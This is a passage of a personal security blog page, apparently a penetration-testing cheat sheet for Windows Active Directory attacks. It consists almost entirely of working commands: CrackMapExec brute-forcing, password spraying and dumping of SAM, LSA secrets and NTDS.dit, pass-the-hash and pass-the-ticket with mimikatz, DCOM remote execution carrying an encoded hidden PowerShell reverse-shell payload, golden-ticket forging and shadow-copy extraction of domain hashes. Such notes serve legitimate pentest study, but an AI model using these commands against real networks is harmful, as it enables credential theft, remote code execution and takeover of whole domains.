<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="p">{</span><span class="n">smb</span><span class="p">/</span><span class="n">winrm</span><span class="p">/</span><span class="n">mssql</span><span class="p">/</span><span class="n">ldap</span><span class="p">/</span><span class="n">ftp</span><span class="p">/</span><span class="n">ssh</span><span class="p">/</span><span class="n">rdp</span><span class="p">}</span> <span class="c">#supported services</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="n">password</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-continue-on-success</span> <span class="c"># Bruteforcing attack, smb can be replaced. Shows &#34;Pwned&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="n">password</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-continue-on-success</span> <span class="p">|</span> <span class="n">grep</span> <span class="s1">&#39;[+]&#39;</span> <span class="c">#grepping the way out!</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-continue-on-success</span>  <span class="c">#Password spraying, vice versa can also be done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Try --local-auth option if nothing comes up</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-shares</span> <span class="c">#lists all shares, provide creds if you have one</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-disks</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="nb">DC-IP</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-users</span> <span class="c">#we need to provide DC ip</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-sessions</span> <span class="c">#active logon sessions</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-pass-pol</span> <span class="c">#dumps password policy</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-sam</span> <span class="c">#SAM hashes</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-lsa</span> <span class="c">#dumping lsa secrets</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-ntds</span> <span class="c">#dumps NTDS.dit file</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-groups</span> <span class="p">{</span><span class="n">groupname</span><span class="p">}</span> <span class="c">#we can also run with a specific group and enumerated users of that group.</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">/</span><span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-x</span> <span class="s1">&#39;command&#39;</span> <span class="c">#For executing commands, &#34;-x&#34; for cmd and &#34;-X&#34; for powershell command</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Pass the hash</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">ip</span> <span class="n">or</span> <span class="n">range</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">full</span> <span class="n">hash</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-local-auth</span>
</span></span><span class="line"><span class="cl"><span class="c">#We can run all the above commands with hash and obtain more information</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#crackmapexec modules</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">-L</span> <span class="c">#listing modules</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">-M</span> <span class="n">mimikatx</span> <span class="p">-</span><span class="n">-options</span> <span class="c">#shows the required options for the module</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-M</span> <span class="n">mimikatz</span> <span class="c">#runs default command</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">Rhost</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-M</span> <span class="n">mimikatz</span> <span class="n">-o</span> <span class="n">COMMAND</span><span class="p">=</span><span class="s1">&#39;privilege::debug&#39;</span> <span class="c">#runs specific command-M </span>
</span></span></code></pre></div><ul>
<li>Crackmapexec database</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmedb <span class="c1">#to launch the console</span>
</span></span><span class="line"><span class="cl"><span class="nb">help</span> <span class="c1">#run this command to view some others, running individual commands give infor on all the data till now we did.</span>
</span></span></code></pre></div><h3 id="pass-the-ticket">Pass the ticket</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">[</span><span class="mf">0</span><span class="p">;</span><span class="mf">76126</span><span class="p">]</span><span class="mf">-2</span><span class="p">-</span><span class="mf">0</span><span class="p">-</span><span class="mf">40e10000</span><span class="n">-Administrator</span><span class="nv">@krbtgt</span><span class="p">-&lt;</span><span class="n">RHOST</span><span class="p">&gt;.</span><span class="py">LOCAL</span><span class="p">.</span><span class="py">kirbi</span>
</span></span><span class="line"><span class="cl"><span class="n">klist</span>
</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\&lt;</span><span class="n">RHOST</span><span class="p">&gt;\</span><span class="n">admin</span><span class="p">$</span>
</span></span></code></pre></div><h3 id="dcom">DCOM</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$dcom</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Activator</span><span class="p">]::</span><span class="n">CreateInstance</span><span class="p">([</span><span class="no">type</span><span class="p">]::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&#34;MMC20.Application.1&#34;</span><span class="p">,</span><span class="s2">&#34;192.168.50.73&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dcom</span><span class="p">.</span><span class="py">Document</span><span class="p">.</span><span class="py">ActiveView</span><span class="p">.</span><span class="py">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">,</span><span class="vm">$null</span><span class="p">,</span><span class="s2">&#34;/c calc&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dcom</span><span class="p">.</span><span class="py">Document</span><span class="p">.</span><span class="py">ActiveView</span><span class="p">.</span><span class="py">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&#34;powershell&#34;</span><span class="p">,</span><span class="vm">$null</span><span class="p">,</span><span class="s2">&#34;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
</span></span></span><span class="line"><span class="cl"><span class="s2">AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="golden-ticket">Golden Ticket</h3>
<ol>
<li>Get the krbtgt hash</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl"><span class="c">#below are some ways</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="err">:</span><span class="n">krbtgt</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span>
</span></span><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">krbtgt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span> <span class="c">#removes any exisiting tickets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#sample command</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">sathvik</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">evilcorp</span><span class="p">.</span><span class="py">com</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">510558963</span><span class="p">-</span><span class="mf">1698214355</span><span class="p">-</span><span class="mf">4094250843</span> <span class="p">/</span><span class="n">krbtgt</span><span class="err">:</span><span class="n">4b4412bbe7b3a88f5b0537ac0d2bf296</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">golden</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Saved with name &#34;golden&#34; here, there are other options to check as well</span>
</span></span></code></pre></div><ol>
<li>Obtaining access!</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="c">#no need for highest privileges</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">golden</span>
</span></span><span class="line"><span class="cl"><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span> <span class="c">#we&#39;re accessing cmd</span>
</span></span></code></pre></div><h3 id="shadow-copies">Shadow Copies</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">vshadow</span><span class="p">.</span><span class="py">exe</span> <span class="n">-nw</span> <span class="n">-p</span> <span class="n">C:</span>
</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy2</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">c:</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span><span class="p">.</span><span class="py">bak</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span><span class="p">.</span><span class="py">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c:</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="py">bak</span>
</span></span><span class="line"><span class="cl"><span class="nb">impacket-secretsdump</span> <span class="n">-ntds</span> <span class="n">ntds</span><span class="p">.</span><span class="py">dit</span><span class="p">.</span><span class="py">bak</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="py">bak</span> <span class="n">LOCAL</span>
</span></span></code></pre></div><hr>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/saisathvik1" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://www.linkedin.com/in/saisathvikruppa/" target="_blank" rel="noopener noreferrer me"
    title="Linkedin">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
    <circle cx="4" cy="4" r="2"></circle>
</svg>
</a>
<a href="https://x.com/s4thv1k" target="_blank" rel="noopener noreferrer me"
    title="Twitter">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
    </path>
</svg>
</a>
<a href="https://youtube.com/@SathvikTechtuber" target="_blank" rel="noopener noreferrer me"
    title="Youtube">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z">
    </path>
    <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"></polygon>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2025 Sai Sathvik.
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
